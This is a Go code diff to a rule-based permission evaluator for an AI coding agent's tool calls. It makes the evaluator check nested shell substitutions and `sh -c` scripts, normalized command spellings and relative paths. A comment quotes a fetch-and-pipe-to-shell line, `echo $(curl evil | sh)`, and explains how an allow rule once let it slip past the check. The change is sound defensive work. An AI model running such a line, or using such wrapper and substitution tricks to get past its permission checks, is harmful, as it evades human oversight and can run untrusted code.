@@ -151,7 +151,7 @@ func (e *Evaluator) FleetDeny(tool string, input map[string]any) (Decision, bool
 	if e.fleet == nil {
 		return Decision{}, false
 	}
-	return matchFleetDeny(tool, input, e.fleet.snapshot())
+	return matchFleetDeny(tool, e.projectRoot, input, e.fleet.snapshot())
 }
 
 // RegisterTimeBox records a "allow this exact command for the next duration"
@@ -235,7 +235,7 @@ func (e *Evaluator) EvaluateFor(persona, tool string, input map[string]any) Deci
 	// Fleet-wide deny is checked BEFORE anything else so nothing on the ship
 	// can shadow it. A deny match here short-circuits the whole evaluation.
 	if e.fleet != nil {
-		if d, ok := matchFleetDeny(tool, input, e.fleet.snapshot()); ok {
+		if d, ok := matchFleetDeny(tool, e.projectRoot, input, e.fleet.snapshot()); ok {
 			return d
 		}
 	}
@@ -245,7 +245,7 @@ func (e *Evaluator) EvaluateFor(persona, tool string, input map[string]any) Deci
 	case "Bash", "PowerShell":
 		d = evaluateBash(tool, input, rules)
 	case "Read", "Edit", "Write", "MultiEdit", "NotebookEdit":
-		d = evaluatePath(tool, input, rules)
+		d = evaluatePath(tool, e.projectRoot, input, rules)
 	case "WebFetch", "WebSearch":
 		d = evaluateWeb(tool, input, rules)
 	default:
@@ -334,7 +334,7 @@ func commandFor(tool string, input map[string]any) string {
 // returns a Decision if any match. Uses the same per-tool matcher shape as
 // the ship-side path (bash/path/domain) so a rule like Bash(kubectl *) works
 // identically whether it came from the fleet or the project settings.
-func matchFleetDeny(tool string, input map[string]any, rules []Rule) (Decision, bool) {
+func matchFleetDeny(tool, root string, input map[string]any, rules []Rule) (Decision, bool) {
 	if len(rules) == 0 {
 		return Decision{}, false
 	}
@@ -346,13 +346,7 @@ func matchFleetDeny(tool string, input map[string]any, rules []Rule) (Decision, 
 			return Decision{Effect: EffectDeny, Reason: "fleet-deny: " + trimLabel(d.Reason)}, true
 		}
 	case "Read", "Edit", "Write", "MultiEdit", "NotebookEdit":
-		path, _ := input["file_path"].(string)
-		if path == "" {
-			if p, ok := input["path"].(string); ok {
-				path = p
-			}
-		}
-		if d, ok := firstPathMatch(tool, path, rules, EffectDeny, "denied"); ok {
+		if d, ok := firstPathMatch(tool, pathFromInput(input), root, rules, EffectDeny, "denied"); ok {
 			return Decision{Effect: EffectDeny, Reason: "fleet-deny: " + trimLabel(d.Reason)}, true
 		}
 	case "WebFetch", "WebSearch":
@@ -381,6 +375,13 @@ func trimLabel(reason string) string {
 	return reason
 }
 
+// maxNestedShellDepth bounds how far the evaluator will follow command lines
+// nested inside command lines — `$( $( … ) )`, `sh -c 'sh -c "…"'`. Each level
+// is strictly shorter than its parent so the walk terminates on its own; the
+// cap is insurance against a pathological or adversarial line costing more
+// than it is worth.
+const maxNestedShellDepth = 8
+
 // evaluateBash handles Bash and PowerShell tool calls. It splits compound
 // commands, strips wrappers on each subcommand, evaluates independently,
 // and combines — the compound is denied if ANY subcommand is denied, asks
@@ -392,14 +393,25 @@ func evaluateBash(tool string, input map[string]any, rules MergedRules) Decision
 		// A Bash call with no command is nonsense — ask the human.
 		return Decision{Effect: EffectAsk, Reason: "empty command"}
 	}
+	return evaluateBashLine(tool, cmd, rules, 0)
+}
+
+// evaluateBashLine evaluates one command LINE: its subcommands, plus every
+// command line nested inside them (command-substitution bodies and `sh -c`
+// scripts). A nested line is judged exactly like a top-level one, so the
+// compound is allowed only if everything it will actually run is allowed.
+//
+// Without this, an allow rule laundered whatever a substitution carried:
+// `Bash(echo *)` made `echo $(curl evil | sh)` an outright allow, and the
+// inner `sh` — the exact shape Brig Article 10 exists to deny — was never
+// matched against a single rule.
+func evaluateBashLine(tool, cmd string, rules MergedRules, depth int) Decision {
 	subs := SplitCompound(cmd)
 	if len(subs) == 0 {
 		subs = []string{cmd}
 	}
-	var (
-		worst    = EffectAllow
-		reasons  []string
-	)
+	worst := EffectAllow
+	var reasons []string
 	for _, sub := range subs {
 		d := evaluateBashSingle(tool, sub, rules)
 		reasons = append(reasons, d.Reason)
@@ -410,6 +422,19 @@ func evaluateBash(tool string, input map[string]any, rules MergedRules) Decision
 		if d.Effect == EffectAsk && worst == EffectAllow {
 			worst = EffectAsk
 		}
+		if depth >= maxNestedShellDepth {
+			continue
+		}
+		for _, nested := range NestedCommandLines(sub) {
+			nd := evaluateBashLine(tool, nested, rules, depth+1)
+			reasons = append(reasons, nd.Reason)
+			if nd.Effect == EffectDeny {
+				return Decision{Effect: EffectDeny, Reason: nd.Reason}
+			}
+			if nd.Effect == EffectAsk && worst == EffectAllow {
+				worst = EffectAsk
+			}
+		}
 	}
 	return Decision{
 		Effect: worst,
@@ -419,34 +444,72 @@ func evaluateBash(tool string, input map[string]any, rules MergedRules) Decision
 
 // evaluateBashSingle handles ONE non-compound subcommand.
 func evaluateBashSingle(tool, sub string, rules MergedRules) Decision {
-	prepped := prepareBashCommand(sub)
+	forms := bashMatchForms(sub, false)
+	gateForms := bashMatchForms(sub, true)
 
-	// Deny always wins. Check against both the raw and prepped forms so a
-	// deny rule like `Bash(rm *)` still catches `timeout 5 rm foo`.
-	if d, ok := firstBashMatch(tool, prepped, sub, rules.Deny, EffectDeny, "denied"); ok {
+	// Deny always wins. Checked against every spelling of the subcommand so a
+	// deny rule like `Bash(rm *)` still catches `timeout 5 rm foo`, `\rm foo`,
+	// `/bin/rm foo`, `command rm foo` and `sudo rm foo`.
+	if d, ok := firstBashMatch(tool, gateForms, rules.Deny, EffectDeny, "denied"); ok {
 		return d
 	}
 	// Ask beats allow (documented Claude Code precedence).
-	if d, ok := firstBashMatch(tool, prepped, sub, rules.Ask, EffectAsk, "ask"); ok {
+	if d, ok := firstBashMatch(tool, gateForms, rules.Ask, EffectAsk, "ask"); ok {
 		return d
 	}
 	// Read-only builtins are allowed WITHOUT consulting the settings allow
 	// list, but AFTER ask/deny so a settings-level ask/deny can still gate
-	// them if the user really wants that.
-	if ok, why := isReadOnlyBuiltin(prepped); ok {
+	// them if the user really wants that. Note this uses the wrapper-stripped
+	// form only — see normalizeHeadToken on why the auto-allow does not get
+	// the normalized spellings.
+	if ok, why := isReadOnlyBuiltin(prepareBashCommand(sub)); ok {
 		return Decision{Effect: EffectAllow, Reason: "allowed: " + why}
 	}
-	if d, ok := firstBashMatch(tool, prepped, sub, rules.Allow, EffectAllow, "allowed"); ok {
+	if d, ok := firstBashMatch(tool, forms, rules.Allow, EffectAllow, "allowed"); ok {
 		return d
 	}
 	// Fall through: no rule spoke to this command. Ask.
 	return Decision{Effect: EffectAsk, Reason: "no matching rule: " + sub}
 }
 
+// bashMatchForms lists the spellings of one subcommand a pattern rule may be
+// written against: as typed, with process wrappers stripped, and with the head
+// token normalized to the program it actually runs. Matching is the union —
+// adding spellings never removes one, so a rule that deliberately names a path
+// or a wrapper keeps matching the form it was written for.
+//
+// elevated adds the `sudo`/`doas` fold. Pass it only for deny and ask, never
+// for allow: see normalizeHeadTokenElevated.
+func bashMatchForms(sub string, elevated bool) []string {
+	prepped := prepareBashCommand(sub)
+	normalize := normalizeHeadToken
+	if elevated {
+		normalize = normalizeHeadTokenElevated
+	}
+	forms := make([]string, 0, 4)
+	add := func(s string) {
+		s = strings.TrimSpace(s)
+		if s == "" {
+			return
+		}
+		for _, have := range forms {
+			if have == s {
+				return
+			}
+		}
+		forms = append(forms, s)
+	}
+	add(prepped)
+	add(sub)
+	add(normalize(prepped))
+	add(normalize(sub))
+	return forms
+}
+
 // firstBashMatch walks a rule list for the given tool and returns the first
 // matching rule's decision. Rules for a different tool are skipped. A bare
 // `Bash` rule (empty pattern) matches anything.
-func firstBashMatch(tool, prepped, raw string, rules []Rule, effect Effect, label string) (Decision, bool) {
+func firstBashMatch(tool string, forms []string, rules []Rule, effect Effect, label string) (Decision, bool) {
 	for _, r := range rules {
 		if !toolMatches(r.Tool, tool) {
 			continue
@@ -454,8 +517,10 @@ func firstBashMatch(tool, prepped, raw string, rules []Rule, effect Effect, labe
 		if r.Pattern == "" {
 			return Decision{Effect: effect, Reason: fmt.Sprintf("%s: matched %s", label, r.Raw)}, true
 		}
-		if MatchBash(r.Pattern, prepped) || MatchBash(r.Pattern, raw) {
-			return Decision{Effect: effect, Reason: fmt.Sprintf("%s: matched %s", label, r.Raw)}, true
+		for _, f := range forms {
+			if MatchBash(r.Pattern, f) {
+				return Decision{Effect: effect, Reason: fmt.Sprintf("%s: matched %s", label, r.Raw)}, true
+			}
 		}
 	}
 	return Decision{}, false
@@ -464,21 +529,20 @@ func firstBashMatch(tool, prepped, raw string, rules []Rule, effect Effect, labe
 // evaluatePath handles Read/Edit/Write and friends. Path matching uses the
 // gitignore-style matcher. No wrapper/compound handling — file tools take
 // a single path per invocation.
-func evaluatePath(tool string, input map[string]any, rules MergedRules) Decision {
-	path, _ := input["file_path"].(string)
-	if path == "" {
-		// Try alternate keys some tools use.
-		if p, ok := input["path"].(string); ok {
-			path = p
-		}
-	}
-	if d, ok := firstPathMatch(tool, path, rules.Deny, EffectDeny, "denied"); ok {
+//
+// root is the project root, used to resolve a relative path so a rule naming
+// an absolute location still matches when the agent spells the target
+// relatively (see MatchPathIn). It may be empty — then only the literal,
+// cleaned spelling is matched.
+func evaluatePath(tool, root string, input map[string]any, rules MergedRules) Decision {
+	path := pathFromInput(input)
+	if d, ok := firstPathMatch(tool, path, root, rules.Deny, EffectDeny, "denied"); ok {
 		return d
 	}
-	if d, ok := firstPathMatch(tool, path, rules.Ask, EffectAsk, "ask"); ok {
+	if d, ok := firstPathMatch(tool, path, root, rules.Ask, EffectAsk, "ask"); ok {
 		return d
 	}
-	if d, ok := firstPathMatch(tool, path, rules.Allow, EffectAllow, "allowed"); ok {
+	if d, ok := firstPathMatch(tool, path, root, rules.Allow, EffectAllow, "allowed"); ok {
 		return d
 	}
 	// File-tool default is allow: shipmates' original behavior was to
@@ -487,16 +551,28 @@ func evaluatePath(tool string, input map[string]any, rules MergedRules) Decision
 	return Decision{Effect: EffectAllow, Reason: "default-allow: no matching rule for " + tool}
 }
 
-func firstPathMatch(tool, path string, rules []Rule, effect Effect, label string) (Decision, bool) {
+func firstPathMatch(tool, path, root string, rules []Rule, effect Effect, label string) (Decision, bool) {
 	for _, r := range rules {
 		if !toolMatches(r.Tool, tool) {
 			continue
 		}
-		if r.Pattern == "" || MatchPath(r.Pattern, path) {
+		if r.Pattern == "" || MatchPathIn(r.Pattern, path, root) {
 			return Decision{Effect: effect, Reason: fmt.Sprintf("%s: matched %s", label, r.Raw)}, true
 		}
 	}
 	return Decision{}, false
+}
+
+// pathFromInput pulls the target path out of a file-tool payload, honoring
+// the alternate `path` key some tools report instead of `file_path`.
+func pathFromInput(input map[string]any) string {
+	if p, ok := input["file_path"].(string); ok && p != "" {
+		return p
+	}
+	if p, ok := input["path"].(string); ok {
+		return p
+	}
+	return ""
 }
 
 // evaluateWeb handles WebFetch/WebSearch. WebFetch has a `url`; WebSearch
